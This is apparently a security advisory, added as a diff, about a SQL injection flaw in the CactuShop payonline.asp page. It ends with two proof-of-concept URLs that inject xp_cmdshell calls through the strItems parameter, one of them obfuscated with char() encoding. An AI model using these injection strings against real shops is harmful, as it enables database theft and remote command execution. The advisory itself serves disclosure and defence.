@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/10019/info
+
+Reportedly CactuShop is prone to a remote SQL injection vulnerability. This issue is due to a failure to properly sanitize user-supplied URI input before using it to craft an SQL query.
+
+As a result of this, a malicious user may influence database queries in order to view or modify sensitive information, potentially compromising the software or the database. It may be possible for an attacker to disclose the administrator password hash by exploiting this issue. 
+
+http://www.example.com/payonline.asp/strAgain=yes&CD_EmailAddress=dummy@someemailservice.com&CD_Password=&CD_AffiliateID=&CD_CardholderCountry=200&CD_ShippingCountry=200&CD_ShippingPostcode=&strPaymentSystem=email&CP_CouponCode=&numLanguageID=1&numCurrencyID=1&numItemCount=2&strItems=214;+exec+master..xp_cmdshell+'dir+c:'--z165z&strQuantities=6z2z&numShipMethod=1&btnProceed=Proceed
+
+http://www.example.com/payonline.asp/strAgain=yes&CD_EmailAddress=dummy@someemailservice.com&CD_Password=&CD_AffiliateID=&CD_CardholderCountry=200&CD_ShippingCountry=200&CD_ShippingPostcode=&strPaymentSystem=email&CP_CouponCode=&numLanguageID=1&numCurrencyID=1&numItemCount=2&strItems=214;declare%20@a%20sysname%20set%20@a%20=%20char(100)%2bchar(105)%2bchar(114)%2bchar(32)%2bchar(99)%2bchar(58)%20exec%20master..xp_cmdshell%20@a;--z165z&strQuantities=6z2z&numShipMethod=1&btnProceed=Proceed 
